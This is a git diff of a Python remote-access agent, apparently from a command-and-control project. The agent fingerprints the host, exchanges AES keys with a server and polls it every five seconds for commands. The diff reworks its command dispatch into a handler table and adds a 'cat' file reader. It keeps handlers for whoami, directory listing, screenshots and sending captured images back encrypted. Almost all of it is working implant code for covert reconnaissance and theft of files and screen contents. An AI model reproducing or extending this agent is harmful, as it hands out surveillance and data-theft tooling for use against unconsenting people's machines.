@@ -1,11 +1,10 @@
-from paths import DASHBOARD_HTML, SCREENSHOT, OUTPUT_IMG
-from loguru import logger
 import os,time ,base64,pyautogui,requests,threading,socket,getpass,uuid,hashlib,sys
-import OPERATIONS,PROTOCOLS,encryptions
-# ---- end imports ----
 sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "shared"))
 # ---- end path bootstrap ----
-
+from paths import DASHBOARD_HTML, SCREENSHOT, OUTPUT_IMG
+from loguru import logger
+import OPERATIONS,PROTOCOLS,encryptions
+# ---- end imports ----
 #encrypt the aes with the server's public key, and sent it to the server - encrypted
 aes_key = encryptions.aes_key_creation()
 logger.info(f"Successfully created AES key")
@@ -20,18 +19,12 @@ def generate_agent_id():
     hostname = socket.gethostname()
     username = getpass.getuser()
     mac_address = str(uuid.getnode())  # מחזיר את כתובת ה-MAC כמספר שלם
-    # 2. שרשור למחרוזת אחת ארוכה
     raw_fingerprint = f"{hostname}-{username}-{mac_address}"
-    # 3. העברה דרך פונקציית גיבוב לקבלת מזהה קבוע וייחודי
-    # חייבים לעשות encode כדי להפוך את המחרוזת ל-Bytes לפני הגיבוב
     agent_hash = hashlib.sha256(raw_fingerprint.encode('utf-8')).hexdigest()
-    # אפשר לחתוך את ה-Hash (שיוצא ארוך) ל-16 תווים כדי שיהיה נוח יותר לעין בלוגים
     return agent_hash[:16]
-
 
 def decrypt_data_by_server(msg:str, iv:str , aes_key:int):
     """
-
     :param msg(str): recieve at base64 code
     :param iv(str): recieve at base64 code
     :param aes_key(int): recieve at int (which represent bytes - need to convert)
@@ -45,8 +38,11 @@ def decrypt_data_by_server(msg:str, iv:str , aes_key:int):
     bytes_aes_key = (aes_key.to_bytes(16 , 'little'))
     decrypted_msg_by_server = encryptions.aes_decryption(decoded64_msg,bytes_aes_key,decoded64_iv)
     unpaded_decrypted_msg_by_server = encryptions.aes_unpadder(decrypted_msg_by_server)
+
+    #check for image data magic number starting
     if unpaded_decrypted_msg_by_server.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
         return  unpaded_decrypted_msg_by_server
+    #if not image - text ,which decoded in utf-8
     else:
         return  unpaded_decrypted_msg_by_server.decode('utf-8')
 
@@ -62,67 +58,99 @@ def encrypt_data_by_server(msg:str,aes_key:int)->bytes:
     return msg_encrypted, iv
 
 
+def cmd_cat(aes_key,args):
+    logger.info("client has asked for 'cat' command")
+    cwd = os.getcwd()
+    final_url = os.path.abspath(f"{cwd}/{os.path.basename(args[0])}")
+    logger.info(f"the last url is {final_url} that the customer asked is: ")
+    try:
+        with open(final_url, "r") as f:
+            content = f.read()
+            encrypted_content, iv = encrypt_data_by_server(content, aes_key)
+            return encrypted_content, iv
+    except FileNotFoundError:
+        msg = "file not found"
+        encrypted_content, iv = encrypt_data_by_server(msg, aes_key)
+        return encrypted_content, iv
+
+def cmd_whoami(aes_key,args):
+    logger.info("client has asked for 'whoami' command")
+    user = OPERATIONS.whoami()
+    aes_key = int(agent_data['aes_key'])
+    encrypted_content, iv = encrypt_data_by_server(user, aes_key)
+    return encrypted_content,iv
+
+def cmd_dir(aes_key,args):
+    logger.info("client has asked for 'dir' command")
+    cwd = os.getcwd()
+    files = os.listdir(cwd)
+    str_listed = ",".join(files)
+    encrypted_content,iv  = encrypt_data_by_server(str_listed, aes_key)
+    return encrypted_content,iv
+
+
+def cmd_screenshot(aes_key, args):
+    pyautogui.screenshot(str(SCREENSHOT))
+    msg = "screenshot successfuly"
+    encrypted_content, iv = encrypt_data_by_server(msg, aes_key)
+    return encrypted_content, iv
+
+def cmd_send_img(aes_key, args):
+    try:
+        URL_PIC = str(SCREENSHOT)
+        with open(URL_PIC, 'rb') as f:
+            img_data = f.read()
+            logger.info("the img_data has loaded successfuly")
+            encrypted_content, iv = encrypt_data_by_server(img_data, aes_key)
+            return  encrypted_content, iv
+    except FileNotFoundError:
+        msg = "no image. please use SCREENSHOT before"
+        encrypted_content, iv = encrypt_data_by_server(msg, aes_key)
+        return  encrypted_content, iv
+
+COMMAND_HANDLERS = {
+    "cat":        cmd_cat ,
+    "dir":        cmd_dir ,
+    "whoami":     cmd_whoami,
+    "SCREENSHOT": cmd_screenshot,
+    "SEND_IMG": cmd_send_img
+}
+
 def command_handler():
     while True:
         if agent_data['is_encrypted'] == 'True':
             time.sleep(5)
+            #becon - agent ask server for a command
             server_response = ask_for_commands()
-            print(server_response)
+            logger.info(server_response)
             #ask_for_commands return a strings which is actually base64 decode
             msg= server_response['msg']
             iv = server_response['iv']
             decrypted_server_response = decrypt_data_by_server(msg,iv,int(agent_data['aes_key']))
+
+            #--------------------------------------
+            logger.info(decrypted_server_response)
             if decrypted_server_response:
                 #here i have to decrypt p
-                logger.info(decrypted_server_response)
                 if decrypted_server_response == "nothing":
-                    print("no command by server")
+                    logger.info("no command by server")
                 else:
                     aes_key = int(agent_data['aes_key'])
-                    match decrypted_server_response:
-                        case "whoami":
-                            user = OPERATIONS.whoami()
-                            aes_key = int(agent_data['aes_key'])
-                            encrypted_content , iv  = encrypt_data_by_server(user, aes_key)
-                            response = send_data_to_server(encrypted_content, iv)
-                            logger.info(response)
-                        case "dir":
-                            cwd = os.getcwd()
-                            files = os.listdir(cwd)
-                            # bytes_list  = pickle.dumps(files)
-                            str_listed = ",".join(files)
-                            encrypted_content , iv  = encrypt_data_by_server(str_listed, aes_key)
-                            response = send_data_to_server(encrypted_content, iv)
-                            logger.info(response)
-                        case "SCREENSHOT":
-                            pyautogui.screenshot(str(SCREENSHOT))
-                            msg = "screenshot successfuly"
-                            encrypted_content, iv = encrypt_data_by_server(msg, aes_key)
-                            response = send_data_to_server(encrypted_content, iv)
-                            logger.info(response)
-                        #------------------------------
-                        case "SEND_IMG":
-                            try:
-                                URL_PIC = str(SCREENSHOT)
-                                with open(URL_PIC, 'rb') as f:
-                                    img_data = f.read()
-                                    logger.info("the img_data has loaded successfuly")
-                                    encrypted_content, iv = encrypt_data_by_server(img_data, aes_key)
-                                    response = send_data_to_server(encrypted_content, iv)
-                                    logger.info(response)
-                            except FileNotFoundError:
-                                print("file not found")
-                                msg = "no image. please use SCREENSHOT before"
-                                encrypted_content, iv = encrypt_data_by_server(msg, aes_key)
-                                response = send_data_to_server(encrypted_content, iv)
-                                logger.info(response)
-                        case _:
-                            encrypted_content, iv = encrypt_data_by_server("Alert: Unknown action received", aes_key)
-                            response = send_data_to_server(encrypted_content, iv)
-                            logger.info(response)
-                        # ------------------------------
+                command, *args = decrypted_server_response.split()
+                handler = COMMAND_HANDLERS.get(command)
+                if handler:
+                    try:
+                        encrypted_content, iv = handler(aes_key,args)
+                        response = send_data_to_server(encrypted_content, iv)
+                        logger.info(response)
+                    except Exception as e:
+                        logger.error(f"handler for '{command}' failed: {e}")
+                        encrypted_content, iv = encrypt_data_by_server("Alert: command failed", aes_key)
+                        response = send_data_to_server(encrypted_content, iv)
+                        logger.info(response)
             else:
-                print("no avilable command")
+                #might be not usefuk - to delete!
+                logger.info("no avilable command")
 
 def ask_for_commands():
             try:
